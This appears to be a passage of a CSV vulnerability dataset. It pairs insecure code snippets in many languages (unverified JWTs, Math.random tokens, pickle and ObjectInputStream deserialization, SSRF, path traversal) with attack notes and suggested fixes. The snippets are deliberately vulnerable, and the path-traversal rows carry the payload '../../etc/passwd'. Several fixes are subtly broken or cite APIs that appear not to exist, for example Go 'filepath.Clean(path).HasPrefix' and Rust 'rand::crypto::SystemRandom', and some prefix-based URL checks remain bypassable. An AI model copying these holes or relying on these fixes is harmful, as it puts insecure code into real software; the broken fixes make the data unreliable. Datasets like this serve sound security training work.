vuln-405,Perl,Insecure Session Timeout,No session cookie expiration.,"$r->headers_out->set('Set-Cookie' => ""session=$id"");",Persistent session attacks.,"Set: $r->headers_out->set('Set-Cookie' => ""session=$id; Max-Age=3600"")","$r->headers_out->set('Set-Cookie' => ""session=$id"");",False,False,False,False,52,False,True,False,Authentication,1
vuln-406,Node.js,Insecure JWT Handling,Accepting unverified JWT tokens.,const payload = jwt.decode(token);,Forge tokens without signature verification.,"Use: jwt.verify(token, secret, { algorithms: ['HS256'] })",const payload = jwt.decode(token);,False,False,False,False,34,False,False,False,Other,1
vuln-407,Python,Insecure JWT Handling,No JWT signature verification.,"payload = jwt.decode(token, options={'verify_signature': False})",Craft malicious JWTs to bypass auth.,"Verify: jwt.decode(token, key=secret, algorithms=['HS256'])","payload = jwt.decode(token, options={'verify_signature': False})",False,False,False,False,64,False,True,False,Other,1
vuln-408,Java,Insecure JWT Handling,Parsing JWT without verification.,JWT jwt = JWTParser.parse(token);,Inject forged JWTs.,Use: Jwts.parser().setSigningKey(key).parseClaimsJws(token),JWT jwt = JWTParser.parse(token);,False,False,False,False,33,False,False,False,Other,1
vuln-409,PHP,Insecure JWT Handling,No JWT signature validation.,"$payload = JWT::decode($token, null, false);",Forge tokens to impersonate users.,"Verify: JWT::decode($token, $key, ['HS256'])","$payload = JWT::decode($token, null, false);",False,False,False,False,44,False,False,False,Other,1
vuln-410,Ruby,Insecure JWT Handling,Decoding JWT without verification.,"payload = JWT.decode(token, nil, false)",Craft malicious JWTs.,"Verify: JWT.decode(token, secret, true, algorithm: 'HS256')","payload = JWT.decode(token, nil, false)",False,False,False,False,39,False,False,False,Other,1
vuln-411,Go,Insecure JWT Handling,Parsing JWT without validation.,"token, _ := jwt.Parse(tokenString, nil)",Forge tokens to bypass auth.,"Verify: jwt.Parse(tokenString, func(token *jwt.Token) (interface{}, error) { return key, nil })","token, _ := jwt.Parse(tokenString, nil)",False,False,False,False,39,False,False,False,Other,1
vuln-412,C# (.NET),Insecure JWT Handling,No JWT signature verification.,var payload = JwtSecurityTokenHandler().ReadJwtToken(token);,Inject forged JWTs.,"Validate: new JwtSecurityTokenHandler().ValidateToken(token, validationParameters, out _)",var payload = JwtSecurityTokenHandler().ReadJwtToken(token);,False,False,False,False,60,False,False,False,Other,1
vuln-413,Kotlin,Insecure JWT Handling,Parsing JWT without verification.,val jwt = JWT.decode(token),Craft malicious JWTs.,Verify: JWT.require(Algorithm.HMAC256(secret)).build().verify(token),val jwt = JWT.decode(token),False,False,False,False,27,False,False,False,Other,1
vuln-414,Scala,Insecure JWT Handling,No JWT signature validation.,val payload = JWT.decode(token),Forge tokens to impersonate users.,Verify: JWT.require(Algorithm.HMAC256(secret)).build.verify(token),val payload = JWT.decode(token),False,False,False,False,31,False,False,False,Other,1
vuln-415,Rust,Insecure JWT Handling,Parsing JWT without validation.,let claims = jsonwebtoken::decode_header(&token)?;,Inject forged JWTs.,"Verify: jsonwebtoken::decode(&token, &DecodingKey::from_secret(secret.as_ref()), &Validation::new(Algorithm::HS256))",let claims = jsonwebtoken::decode_header(&token)?;,False,False,False,False,50,False,False,False,Other,1
vuln-416,Elixir,Insecure JWT Handling,No JWT signature verification.,"{:ok, payload, _} = Joken.peek(token)",Craft malicious JWTs.,"Verify: Joken.verify_and_validate(config, token)","{:ok, payload, _} = Joken.peek(token)",False,False,False,False,37,False,False,False,Other,1
vuln-417,Perl,Insecure JWT Handling,Decoding JWT without verification.,"my $payload = decode_jwt($token, undef, 0);",Forge tokens to bypass auth.,"Verify: decode_jwt($token, $secret, 1)","my $payload = decode_jwt($token, undef, 0);",False,False,False,False,43,False,False,False,Other,1
vuln-418,Node.js,Weak Random Number Generation,Using Math.random for security-sensitive operations.,const token = Math.random().toString(36).substring(2);,Predict random values for token guessing.,Use crypto.randomBytes(16).toString('hex'),const token = Math.random().toString(36).substring(2);,False,False,False,False,54,False,False,False,Other,1
vuln-419,Python,Weak Random Number Generation,Using random module for cryptographic purposes.,"import random; token = ''.join(random.choices('abcdef0123456789', k=16))",Predict tokens due to weak PRNG.,Use secrets.token_hex(16),"import random; token = ''.join(random.choices('abcdef0123456789', k=16))",False,False,False,False,72,False,True,False,Other,1
vuln-420,Java,Weak Random Number Generation,Using Random instead of SecureRandom.,Random rand = new Random(); String token = String.valueOf(rand.nextLong());,Predict random values.,Use SecureRandom: new SecureRandom().nextBytes(bytes),Random rand = new Random(); String token = String.valueOf(rand.nextLong());,False,False,False,False,75,False,False,False,Other,1
vuln-421,PHP,Weak Random Number Generation,Using rand() for security tokens.,"$token = substr(str_shuffle('abcdef0123456789'), 0, 16);",Predict tokens due to weak randomness.,Use random_bytes(16) and bin2hex,"$token = substr(str_shuffle('abcdef0123456789'), 0, 16);",False,False,False,False,56,False,True,False,Other,1
vuln-422,Ruby,Weak Random Number Generation,Using rand for cryptographic tokens.,token = (0...16).map { ('a'..'z').to_a[rand(26)] }.join,Predict random tokens.,Use SecureRandom.hex(16),token = (0...16).map { ('a'..'z').to_a[rand(26)] }.join,False,False,False,False,55,False,True,False,Other,1
vuln-423,Go,Weak Random Number Generation,Using math/rand for security purposes.,rand.Seed(time.Now().UnixNano()); token := rand.Int63(),Predict values based on seed.,Use crypto/rand: crypto.Read(bytes),rand.Seed(time.Now().UnixNano()); token := rand.Int63(),False,False,False,False,55,False,False,False,Other,1
vuln-424,C# (.NET),Weak Random Number Generation,Using Random for cryptographic tokens.,var rand = new Random(); var token = rand.Next().ToString();,Predict random values.,Use RNGCryptoServiceProvider: GetBytes(bytes),var rand = new Random(); var token = rand.Next().ToString();,False,False,False,False,60,False,False,False,Other,1
vuln-425,Kotlin,Weak Random Number Generation,Using Random for security tokens.,val token = Random().nextLong().toString(),Predict tokens due to weak PRNG.,Use SecureRandom: SecureRandom().nextBytes(bytes),val token = Random().nextLong().toString(),False,False,False,False,42,False,False,False,Other,1
vuln-426,Scala,Weak Random Number Generation,Using scala.util.Random for crypto.,val token = scala.util.Random.nextString(16),Predict random values.,Use SecureRandom: java.security.SecureRandom,val token = scala.util.Random.nextString(16),False,False,False,False,44,False,False,False,Other,1
vuln-427,Rust,Weak Random Number Generation,Using rand::thread_rng for crypto.,let token = thread_rng().gen::<u64>().to_string();,Predict values from weak PRNG.,Use rand::crypto::SystemRandom,let token = thread_rng().gen::<u64>().to_string();,False,False,False,False,50,False,False,False,Other,1
vuln-428,Elixir,Weak Random Number Generation,Using :rand for cryptographic tokens.,token = :rand.uniform(1_000_000_000) |> Integer.to_string(),Predict random tokens.,Use :crypto.strong_rand_bytes(16) |> Base.encode16(),token = :rand.uniform(1_000_000_000) |> Integer.to_string(),False,False,False,False,59,False,False,False,Other,1
vuln-429,Perl,Weak Random Number Generation,Using rand for security tokens.,"my $token = join '', map { ('a'..'z')[rand 26] } 1..16;",Predict random values.,Use Crypt::Random::Source for secure randomness.,"my $token = join '', map { ('a'..'z')[rand 26] } 1..16;",False,False,False,False,55,False,True,False,Other,1
vuln-430,Node.js,Insecure Cookie Flags,Cookies missing Secure and HttpOnly flags.,"res.cookie('session', token);",Steal cookies via XSS or MITM.,"Set: res.cookie('session', token, { secure: true, httpOnly: true })","res.cookie('session', token);",False,False,False,False,29,False,True,False,Other,1
vuln-431,Python,Insecure Cookie Flags,Cookies without Secure or HttpOnly.,"response.set_cookie('session', token)",Access cookies via XSS or insecure HTTP.,"Set: response.set_cookie('session', token, secure=True, httponly=True)","response.set_cookie('session', token)",False,False,False,False,37,False,True,False,Other,1
vuln-432,Java,Insecure Cookie Flags,Cookies missing security flags.,"Cookie cookie = new Cookie(""session"", token); response.addCookie(cookie);",Steal cookies via XSS or MITM.,Set: cookie.setSecure(true); cookie.setHttpOnly(true);,"Cookie cookie = new Cookie(""session"", token); response.addCookie(cookie);",False,False,False,False,73,False,True,False,Other,1
vuln-433,PHP,Insecure Cookie Flags,Cookies without Secure or HttpOnly.,"setcookie('session', $token);",Steal cookies via XSS or HTTP.,"Set: setcookie('session', $token, ['secure' => true, 'httponly' => true]);","setcookie('session', $token);",False,False,False,False,29,False,True,False,Other,1
vuln-434,Ruby,Insecure Cookie Flags,Cookies missing security flags.,cookies[:session] = token,Access cookies via XSS or MITM.,"Set: cookies[:session] = { value: token, secure: true, httponly: true }",cookies[:session] = token,False,False,False,False,25,False,False,False,Other,1
vuln-435,Go,Insecure Cookie Flags,Cookies without Secure or HttpOnly.,"http.SetCookie(w, &http.Cookie{Name: ""session"", Value: token})",Steal cookies via XSS or HTTP.,"Set: &http.Cookie{Name: ""session"", Value: token, Secure: true, HttpOnly: true}","http.SetCookie(w, &http.Cookie{Name: ""session"", Value: token})",False,False,False,False,62,False,True,False,Other,1
vuln-436,C# (.NET),Insecure Cookie Flags,Cookies missing security flags.,"Response.Cookies.Append(""session"", token);",Steal via XSS or insecure HTTP.,"Set: Response.Cookies.Append(""session"", token, new CookieOptions { Secure = true, HttpOnly = true });","Response.Cookies.Append(""session"", token);",False,False,False,False,42,False,True,False,Other,1
vuln-437,Kotlin,Insecure Cookie Flags,Cookies without Secure or HttpOnly.,"call.response.cookies.append(""session"", token)",Access cookies via XSS or MITM.,"Set: call.response.cookies.append(Cookie(""session"", token, secure = true, httpOnly = true))","call.response.cookies.append(""session"", token)",False,False,False,False,46,False,True,False,Other,1
vuln-438,Scala,Insecure Cookie Flags,Cookies missing security flags.,"Ok.withCookies(Cookie(""session"", token))",Steal cookies via XSS or HTTP.,"Set: Cookie(""session"", token, secure = true, httpOnly = true)","Ok.withCookies(Cookie(""session"", token))",False,False,False,False,40,False,True,False,Other,1
vuln-439,Rust,Insecure Cookie Flags,Cookies without Secure or HttpOnly.,"res.cookie(Cookie::new(""session"", token))",Access cookies via XSS or MITM.,"Set: Cookie::new_with_attributes(""session"", token, { secure: true, http_only: true })","res.cookie(Cookie::new(""session"", token))",False,False,False,False,41,False,True,False,Other,1
vuln-440,Elixir,Insecure Cookie Flags,Cookies missing security flags.,"put_resp_cookie(conn, ""session"", token)",Steal cookies via XSS or HTTP.,"Set: put_resp_cookie(conn, ""session"", token, secure: true, http_only: true)","put_resp_cookie(conn, ""session"", token)",False,False,False,False,39,False,True,False,Other,1
vuln-441,Perl,Insecure Cookie Flags,Cookies without Secure or HttpOnly.,"$r->headers_out->set('Set-Cookie' => ""session=$token"");",Steal via XSS or insecure HTTP.,"Set: $r->headers_out->set('Set-Cookie' => ""session=$token; Secure; HttpOnly"")","$r->headers_out->set('Set-Cookie' => ""session=$token"");",False,False,False,False,55,False,True,False,Other,1
vuln-443,Python,Server-Side Request Forgery,Fetching unvalidated URLs.,response = requests.get(request.args.get('url')),Request internal endpoints like http://127.0.0.1.,Validate: if urlparse(url).hostname in ALLOWED_HOSTS: requests.get(url),response = requests.get(request.args.get('url')),False,False,False,False,48,False,True,False,Other,1
vuln-444,Java,Server-Side Request Forgery,Unvalidated URL fetching.,"URL url = new URL(request.getParameter(""url"")); url.openConnection().getInputStream();",Access internal APIs or localhost.,Whitelist: if (ALLOWED_HOSTS.contains(url.getHost())) url.openConnection(),"URL url = new URL(request.getParameter(""url"")); url.openConnection().getInputStream();",True,False,True,False,86,False,True,False,Other,1
vuln-445,PHP,Server-Side Request Forgery,Fetching unvalidated URLs.,file_get_contents($_GET['url']);,Request internal resources: http://localhost.,"Validate: if (in_array(parse_url($url, PHP_URL_HOST), $allowed)) file_get_contents($url)",file_get_contents($_GET['url']);,False,False,False,False,32,False,True,False,Other,1
vuln-446,Ruby,Server-Side Request Forgery,Unvalidated URL requests.,response = Net::HTTP.get(URI(params[:url])),Access internal endpoints.,Validate: Net::HTTP.get(URI(url)) if ALLOWED_HOSTS.include?(URI(url).host),response = Net::HTTP.get(URI(params[:url])),True,False,False,False,43,False,False,False,Other,1
vuln-447,Go,Server-Side Request Forgery,Fetching unvalidated URLs.,"resp, _ := http.Get(r.URL.Query().Get(""url""))",Request internal services like http://127.0.0.1.,"Validate: if strings.HasPrefix(url, ""https://allowed.com"") { http.Get(url) }","resp, _ := http.Get(r.URL.Query().Get(""url""))",True,True,False,False,45,False,True,False,Other,1
vuln-448,C# (.NET),Server-Side Request Forgery,Unvalidated URL fetching.,"var response = await new HttpClient().GetAsync(Request.Query[""url""]);",Access internal APIs.,Validate: if (ALLOWED_HOSTS.Contains(new Uri(url).Host)) await client.GetAsync(url),"var response = await new HttpClient().GetAsync(Request.Query[""url""]);",True,True,False,False,69,False,True,False,Other,1
vuln-449,Kotlin,Server-Side Request Forgery,Fetching unvalidated URLs.,"val response = URL(call.request.queryParameters[""url""]).readText()",Request internal endpoints.,Validate: if (url.host in ALLOWED_HOSTS) URL(url).readText(),"val response = URL(call.request.queryParameters[""url""]).readText()",True,True,False,False,66,False,True,False,Other,1
vuln-450,Scala,Server-Side Request Forgery,Unvalidated URL requests.,"val response = scala.io.Source.fromURL(params(""url"")).mkString",Access internal services.,Validate: if (ALLOWED_HOSTS.contains(new URL(url).getHost)) Source.fromURL(url),"val response = scala.io.Source.fromURL(params(""url"")).mkString",True,False,False,False,62,False,True,False,Other,1
vuln-451,Rust,Server-Side Request Forgery,Fetching unvalidated URLs.,"let resp = reqwest::get(&req.query(""url"")?).await?;",Request internal resources.,"Validate: if url.starts_with(""https://allowed.com"") { reqwest::get(url) }","let resp = reqwest::get(&req.query(""url"")?).await?;",True,True,False,False,51,False,True,False,Other,1
vuln-452,Elixir,Server-Side Request Forgery,Unvalidated URL fetching.,"{:ok, _} = HTTPoison.get(params[""url""])",Access internal endpoints.,"Validate: if String.starts_with?(url, ""https://allowed.com"") do HTTPoison.get(url) end","{:ok, _} = HTTPoison.get(params[""url""])",True,False,False,False,39,False,True,False,Other,1
vuln-453,Perl,Server-Side Request Forgery,Fetching unvalidated URLs.,my $response = LWP::UserAgent->new->get($r->param('url'));,Request internal services.,Validate: $ua->get($url) if grep { $url =~ /^$_/ } @allowed;,my $response = LWP::UserAgent->new->get($r->param('url'));,True,False,False,False,58,False,True,False,Other,1
vuln-454,Node.js,Insecure Deserialization,Deserializing untrusted data with node-serialize.,const serialize = require('node-serialize'); serialize.unserialize(userInput);,Inject malicious serialized objects for RCE.,Avoid deserialization; use JSON.parse with validation.,const serialize = require(); serialize.unserialize(userInput);,True,False,False,False,78,False,True,False,Other,1
vuln-455,Python,Insecure Deserialization,Using pickle for untrusted data.,import pickle; obj = pickle.loads(request.data),Craft pickle payload for RCE.,Use JSON or YAML.safe_load; avoid pickle.,import pickle; obj = pickle.loads(request.data),False,False,False,False,47,False,False,False,Other,1
vuln-456,Java,Insecure Deserialization,Deserializing untrusted data with ObjectInputStream.,ObjectInputStream ois = new ObjectInputStream(new ByteArrayInputStream(data)); ois.readObject();,Inject gadget chains for RCE.,Use ObjectInputFilter; whitelist classes.,ObjectInputStream ois = new ObjectInputStream(new ByteArrayInputStream(data)); ois.readObject();,True,False,False,False,96,False,False,False,Other,1
vuln-457,PHP,Insecure Deserialization,Unserializing untrusted data.,$obj = unserialize($_POST['data']);,Inject malicious serialized objects.,Avoid unserialize; use JSON or safe formats.,$obj = unserialize($_POST['data']);,False,False,False,False,35,False,True,False,Other,1
vuln-458,Ruby,Insecure Deserialization,Using Marshal.load on untrusted data.,obj = Marshal.load(user_input),Craft malicious payload for RCE.,Use JSON; avoid Marshal.load on user input.,obj = Marshal.load(user_input),True,False,False,False,30,False,False,False,Other,1
vuln-459,Go,Insecure Deserialization,Decoding untrusted gob data.,decoder := gob.NewDecoder(bytes.NewReader(data)); decoder.Decode(&obj);,Inject malicious gob data.,Use JSON or safe formats; avoid gob for user input.,decoder := gob.NewDecoder(bytes.NewReader(data)); decoder.Decode(&obj);,False,False,False,False,71,False,False,False,Other,1
vuln-460,C# (.NET),Insecure Deserialization,Using BinaryFormatter on untrusted data.,BinaryFormatter bf = new BinaryFormatter(); bf.Deserialize(stream);,Inject malicious serialized objects.,Use JsonSerializer; avoid BinaryFormatter.,BinaryFormatter bf = new BinaryFormatter(); bf.Deserialize(stream);,False,False,False,False,67,False,False,False,Other,1
vuln-461,Kotlin,Insecure Deserialization,Deserializing untrusted data.,val ois = ObjectInputStream(ByteArrayInputStream(data)); val obj = ois.readObject(),Craft malicious objects for RCE.,Use JSON or safe formats; avoid ObjectInputStream.,val ois = ObjectInputStream(ByteArrayInputStream(data)); val obj = ois.readObject(),True,False,False,False,83,False,False,False,Other,1
vuln-462,Scala,Insecure Deserialization,Deserializing untrusted Java objects.,val ois = new ObjectInputStream(new ByteArrayInputStream(data)); ois.readObject(),Inject gadget chains for RCE.,Use JSON; avoid ObjectInputStream for user data.,val ois = new ObjectInputStream(new ByteArrayInputStream(data)); ois.readObject(),True,False,False,False,81,False,False,False,Other,1
vuln-463,Rust,Insecure Deserialization,Using serde with untrusted data.,let obj: T = serde_json::from_str(&user_input)?;,Inject malicious JSON to manipulate structs.,Validate JSON schema; use strict typing.,let obj: T = serde_json::from_str(&user_input)?;,True,False,False,False,48,False,False,False,Other,1
vuln-464,Elixir,Insecure Deserialization,Using :erlang.binary_to_term on untrusted data.,obj = :erlang.binary_to_term(user_input),Craft malicious terms for RCE.,Use Jason.decode!; avoid binary_to_term.,obj = :erlang.binary_to_term(user_input),True,False,False,False,40,False,False,False,Other,1
vuln-465,Perl,Insecure Deserialization,Using Storable::thaw on untrusted data.,use Storable qw(thaw); my $obj = thaw($user_input);,Inject malicious serialized data.,Use JSON::XS; avoid Storable for user input.,use Storable qw(thaw); my $obj = thaw($user_input);,True,False,False,False,51,False,False,False,Other,1
vuln-466,Node.js,Insecure GraphQL Introspection,Exposing GraphQL introspection queries.,"const schema = buildSchema(typeDefs); app.use('/graphql', graphqlHTTP({ schema }));",Query schema to map API and craft attacks.,"Disable introspection: graphqlHTTP({ schema, introspection: false })","const schema = buildSchema(typeDefs); app.use('/graphql', graphqlHTTP({ schema }));",False,False,False,False,83,False,True,False,Other,1
vuln-467,Python,Insecure GraphQL Introspection,Allowing GraphQL introspection.,"schema = graphene.Schema(query=Query); app.add_url_rule('/graphql', view_func=GraphQLView.as_view('graphql', schema=schema))",Extract schema to plan attacks.,"Disable introspection: schema = graphene.Schema(query=Query, auto_camelcase=False, introspection=False)","schema = graphene.Schema(query=Query); app.add_url_rule('/graphql', view_func=GraphQLView.as_view('graphql', schema=schema))",True,True,False,False,124,False,True,False,Other,1
vuln-468,Java,Insecure GraphQL Introspection,Exposing GraphQL schema introspection.,@GraphQLApi public class GraphQLController { @GraphQLQuery public DataFetcher<?> query() { ... } },Query schema to discover endpoints.,Disable introspection in GraphQL configuration.,@GraphQLApi public class GraphQLController { @GraphQLQuery public DataFetcher<?> query() { ... } },True,True,False,False,98,False,False,False,Other,1
vuln-469,PHP,Insecure GraphQL Introspection,Allowing GraphQL introspection queries.,"$schema = new Schema(['query' => $queryType]); $result = GraphQL::executeQuery($schema, $request->query);",Map schema to craft targeted queries.,Disable introspection: $schema->disableIntrospection(),"$schema = new Schema(['query' => $queryType]); $result = GraphQL::executeQuery($schema, $request->query);",True,True,False,True,105,False,True,False,Other,1
vuln-470,Ruby,Insecure GraphQL Introspection,Exposing GraphQL introspection.,class MySchema < GraphQL::Schema; query Types::Query; end,Query schema to extract API details.,Disable: class MySchema < GraphQL::Schema; query Types::Query; introspection false; end,class MySchema < GraphQL::Schema; query Types::Query; end,True,True,False,False,57,False,False,False,Other,1
vuln-471,Go,Insecure GraphQL Introspection,Allowing GraphQL introspection.,"schema, _ := graphql.NewSchema(graphql.SchemaConfig{Query: queryType})",Extract schema to plan attacks.,Disable introspection in gqlgen configuration.,"schema, _ := graphql.NewSchema(graphql.SchemaConfig{Query: queryType})",True,True,False,False,70,False,False,False,Other,1
vuln-472,C# (.NET),Insecure GraphQL Introspection,Exposing GraphQL introspection.,services.AddGraphQL().AddSchema<MySchema>();,Query schema to map API.,Disable: AddGraphQL().AddSchema<MySchema>().DisableIntrospection(),services.AddGraphQL().AddSchema<MySchema>();,False,False,False,False,44,False,False,False,Other,1
vuln-473,Kotlin,Insecure GraphQL Introspection,Allowing GraphQL introspection queries.,graphql { schema { query = Query::class } },Extract schema for attack planning.,Disable introspection in GraphQL-Kotlin config.,graphql { schema { query = Query::class } },True,True,False,False,43,False,False,False,Other,1
vuln-474,Scala,Insecure GraphQL Introspection,Exposing GraphQL introspection.,"SchemaDefinition(queries = List(Field(""query"", ...)))",Query schema to discover endpoints.,Disable introspection in Sangria configuration.,"SchemaDefinition(queries = List(Field(""query"", ...)))",True,True,False,False,53,False,True,False,Other,1
vuln-475,Rust,Insecure GraphQL Introspection,Allowing GraphQL introspection.,"let schema = Schema::build(Query, EmptyMutation, EmptySubscription).finish();",Map schema to craft attacks.,Disable introspection in Juniper configuration.,"let schema = Schema::build(Query, EmptyMutation, EmptySubscription).finish();",True,True,False,False,77,False,False,False,Other,1
vuln-476,Elixir,Insecure GraphQL Introspection,Exposing GraphQL introspection.,schema do query do ... end end,Query schema to extract API details.,Disable: Absinthe.Schema.introspection(false),schema do query do ... end end,True,True,False,False,30,False,False,False,Other,1
vuln-477,Perl,Insecure GraphQL Introspection,Allowing GraphQL introspection queries.,my $schema = GraphQL::Schema->new(query => $query);,Extract schema to plan attacks.,Disable introspection in GraphQL::Perl config.,my $schema = GraphQL::Schema->new(query => $query);,True,True,False,False,51,False,False,False,Other,1
vuln-478,Node.js,Path Traversal,Unvalidated file path access.,"fs.readFileSync(path.join('public', req.query.file))",Access: ../../etc/passwd,"Validate: path.resolve('public', file).startsWith(process.cwd() + '/public')","fs.readFileSync(path.join('public', req.query.file))",True,True,True,False,52,False,True,False,File_Handling,1
vuln-479,Python,Path Traversal,Unvalidated file path in file read.,"with open(os.path.join('public', request.args.get('file'))) as f: return f.read()",Access: ../../etc/passwd,Validate: os.path.realpath(path).startswith(os.path.realpath('public')),"with open(os.path.join('public', request.args.get('file'))) as f: return f.read()",False,False,True,False,81,False,True,False,File_Handling,1
vuln-480,Java,Path Traversal,Unvalidated file path access.,"Files.readString(Paths.get(""public"", request.getParameter(""file"")));",Access: ../../etc/passwd,"Validate: Paths.get('public', file).normalize().startsWith(Paths.get('public'))","Files.readString(Paths.get(""public"", request.getParameter(""file"")));",True,False,False,False,68,False,True,False,File_Handling,1
vuln-481,PHP,Path Traversal,Unvalidated file path in read.,readfile('public/' . $_GET['file']);,Access: ../../etc/passwd,Validate: realpath('public/' . $file) starts with base dir.,readfile('public/' . $_GET['file']);,False,False,True,False,36,False,True,False,File_Handling,1
vuln-482,Ruby,Path Traversal,Unvalidated file path access.,"File.read(File.join('public', params[:file]))",Access: ../../etc/passwd,"Validate: File.expand_path(file, 'public').start_with?(Dir.pwd + '/public')","File.read(File.join('public', params[:file]))",True,False,False,False,45,False,True,False,File_Handling,1
vuln-483,Go,Path Traversal,Unvalidated file path in read.,"data, _ := os.ReadFile(filepath.Join(""public"", r.URL.Query().Get(""file"")))",Access: ../../etc/passwd,"Validate: filepath.Clean(path).HasPrefix(""public"")","data, _ := os.ReadFile(filepath.Join(""public"", r.URL.Query().Get(""file"")))",True,True,True,False,74,False,True,False,File_Handling,1
vuln-484,C# (.NET),Path Traversal,Unvalidated file path access.,"File.ReadAllText(Path.Combine(""public"", Request.Query[""file""]))",Access: ../../web.config,"Validate: Path.GetFullPath(path).StartsWith(Path.GetFullPath(""public""))","File.ReadAllText(Path.Combine(""public"", Request.Query[""file""]))",True,True,False,False,63,False,True,False,File_Handling,1
vuln-485,Kotlin,Path Traversal,Unvalidated file path in read.,"File(""public/${call.request.queryParameters[""file""]}"").readText()",Access: ../../etc/passwd,"Validate: File(baseDir, file).canonicalPath.startsWith(baseDir.canonicalPath)","File(""public/${call.request.queryParameters[""file""]}"").readText()",True,True,False,False,65,False,True,True,File_Handling,1
vuln-486,Scala,Path Traversal,Unvalidated file path access.,"scala.io.Source.fromFile(s""public/${params(""file"")}"").mkString",Access: ../../etc/passwd,"Validate: new File(baseDir, file).getCanonicalPath.startsWith(baseDir)","scala.io.Source.fromFile(s""public/${params(""file"")}"").mkString",True,False,False,False,62,False,True,True,File_Handling,1
vuln-487,Rust,Path Traversal,Unvalidated file path in read.,"fs::read_to_string(Path::new(""public"").join(req.query(""file"")?))?",Access: ../../etc/passwd,"Validate: path.canonicalize()?.starts_with(Path::new(""public"").canonicalize()?)","fs::read_to_string(Path::new(""public"").join(req.query(""file"")?))?",True,True,False,False,65,False,True,False,File_Handling,1
vuln-488,Elixir,Path Traversal,Unvalidated file path access.,"File.read!(""public/"" <> params[""file""])",Access: ../../etc/passwd,"Validate: Path.expand(file, ""public"") |> String.starts_with?(""public"")","File.read!(""public/"" <> params[""file""])",True,False,False,False,39,False,True,False,File_Handling,1
vuln-489,Perl,Path Traversal,Unvalidated file path in read.,"open(my $fh, '<', ""public/$filename"");",Access: ../../etc/passwd,"Validate: realpath(""public/$filename"") =~ /^$base_dir/","open(my $fh, '<', ""public/$filename"");",False,False,True,False,38,False,True,False,File_Handling,1
vuln-490,Node.js,Insecure Rate Limiting,No rate limiting on sensitive endpoints.,"app.post('/login', (req, res) => authenticate(req.body));",Brute force login attempts.,"Use express-rate-limit: app.use(rateLimit({ windowMs: 15 * 60 * 1000, max: 5 }))","app.post('/login', (req, res) => authenticate(req.body));",True,False,False,False,57,False,True,False,Other,1
vuln-491,Python,Insecure Rate Limiting,No rate limiting on authentication.,"@app.route('/login', methods=['POST']) def login(): authenticate(request.form)",Brute force credentials.,"Use Flask-Limiter: limiter.limit(""5 per minute"")(login)","@app.route('/login', methods=['POST']) def login(): authenticate(request.form)",False,False,False,False,78,False,True,False,Other,1
vuln-492,Java,Insecure Rate Limiting,No rate limiting on login endpoint.,"@PostMapping(""/login"") public Response login(@RequestBody Credentials creds) { ... }",Brute force login attempts.,Use Spring Security rate limiting or custom filter.,"@PostMapping(""/login"") public Response login(@RequestBody Credentials creds) { ... }",True,False,False,False,84,False,True,False,Other,1
vuln-493,PHP,Insecure Rate Limiting,No rate limiting on sensitive routes.,if ($_SERVER['REQUEST_METHOD'] === 'POST' && $_SERVER['REQUEST_URI'] === '/login') { authenticate($_POST); },Brute force credentials.,Use rate limiting middleware like throttle.,if ($_SERVER['REQUEST_METHOD'] === 'POST' && $_SERVER['REQUEST_URI'] === '/login') { authenticate($_POST); },False,False,False,False,108,False,True,False,Other,1
vuln-494,Ruby,Insecure Rate Limiting,No rate limiting on authentication.,post '/login' do authenticate(params) end,Brute force login attempts.,"Use rack-attack: Rack::Attack.throttle('logins/ip', limit: 5, period: 60)",post '/login' do authenticate(params) end,True,False,False,False,41,False,True,False,Other,1
vuln-495,Go,Insecure Rate Limiting,No rate limiting on login endpoint.,"http.HandleFunc(""/login"", func(w http.ResponseWriter, r *http.Request) { authenticate(r) })",Brute force credentials.,Use rate limiter: github.com/ulule/limiter,"http.HandleFunc(""/login"", func(w http.ResponseWriter, r *http.Request) { authenticate(r) })",False,False,False,False,91,False,True,False,Other,1
vuln-496,C# (.NET),Insecure Rate Limiting,No rate limiting on sensitive endpoints.,"[HttpPost(""login"")] public IActionResult Login([FromBody] Credentials creds) { ... }",Brute force login attempts.,Use AspNetCoreRateLimit: services.AddRateLimiting(),"[HttpPost(""login"")] public IActionResult Login([FromBody] Credentials creds) { ... }",True,False,False,False,84,False,True,False,Other,1
vuln-497,Kotlin,Insecure Rate Limiting,No rate limiting on authentication.,"post(""/login"") { authenticate(call.request.receive()) }",Brute force credentials.,Use Ktor rate limiting plugin: install(RateLimit) { limit = 5; period = 60.seconds },"post(""/login"") { authenticate(call.request.receive()) }",False,False,False,False,55,False,True,False,Other,1
vuln-498,Scala,Insecure Rate Limiting,No rate limiting on login endpoint.,"post(""/login"") { authenticate(params.as[Credentials]) }",Brute force login attempts.,"Use Play filters: add RateLimitFilter(limit = 5, window = 60.seconds)","post(""/login"") { authenticate(params.as[Credentials]) }",True,False,False,False,55,False,True,False,Other,1
vuln-499,Rust,Insecure Rate Limiting,No rate limiting on sensitive routes.,"router.post(""/login"", |req| authenticate(req.body()?))",Brute force credentials.,Use actix-web middleware for rate limiting.,"router.post(""/login"", |req| authenticate(req.body()?))",True,False,False,False,54,False,True,False,Other,1
vuln-500,Elixir,Insecure Rate Limiting,No rate limiting on authentication.,"post ""/login"", AuthController, :login",Brute force login attempts.,"Use Plug.RateLimit: plug :rate_limit, max: 5, interval: 60_000","post ""/login"", AuthController, :login",False,False,False,False,37,False,True,False,Other,1
vuln-501,Perl,Insecure Rate Limiting,No rate limiting on authentication endpoints.,if ($r->uri eq '/login') { authenticate($r->param('user')); },Brute force credentials via rapid requests.,"Implement rate limiting: use Apache::Throttle; throttle('login', 5, 60);",if ($r->uri eq '/login') { authenticate($r->param('user')); },True,False,False,False,61,False,True,False,Other,1
vuln-502,Node.js,Insecure CSRF Token Storage,Storing CSRF tokens in cookies without validation.,"res.cookie('csrf_token', token); app.post('/action', verifyCsrf);",Forge CSRF tokens via cookie manipulation.,Store tokens server-side; use csurf middleware with session validation.,"res.cookie('csrf_token', token); app.post('/action', verifyCsrf);",False,False,False,False,65,False,True,False,Authentication,1
vuln-503,Python,Insecure CSRF Token Storage,CSRF tokens stored in cookies without server-side checks.,"response.set_cookie('csrf_token', token); @app.route('/action', methods=['POST'])",Manipulate CSRF cookie to bypass protection.,Use Flask-WTF with server-side token validation.,"response.set_cookie('csrf_token', token); @app.route('/action', methods=['POST'])",False,False,False,False,81,False,True,False,Authentication,1
vuln-504,Java,Insecure CSRF Token Storage,Storing CSRF tokens in cookies without validation.,"response.addCookie(new Cookie(""csrf_token"", token));",Forge CSRF tokens via cookie injection.,Use Spring Security CSRF protection with server-side token storage.,"response.addCookie(new Cookie(""csrf_token"", token));",False,False,False,False,52,False,True,False,Authentication,1
